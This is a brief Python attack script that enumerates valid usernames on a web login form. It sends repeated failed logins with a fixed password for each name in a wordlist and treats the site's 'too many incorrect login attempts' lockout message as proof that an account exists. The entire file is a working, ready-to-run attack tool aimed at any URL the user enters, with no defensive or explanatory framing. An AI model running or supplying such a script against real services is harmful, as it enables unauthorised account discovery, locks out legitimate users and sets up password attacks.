#!/usr/bin/env python3

import requests
import sys

# URL = sys.argv[1]

URL = input("Enter target url: ")
with open('usernames.txt') as file:
    usernames = file.read()
    user_list = usernames.split()

for user in user_list:
    for i in range(1, 6):
        data = {"username": user, "password": "password12345"}
        response = requests.post(url=URL, data=data, timeout=3)
        if "too many incorrect login attempts" in response.text:
            print(f"[💥] {user} is a valid username.")
            break
        else:
            print(f"Trying {user}")
    else:
        continue
    break

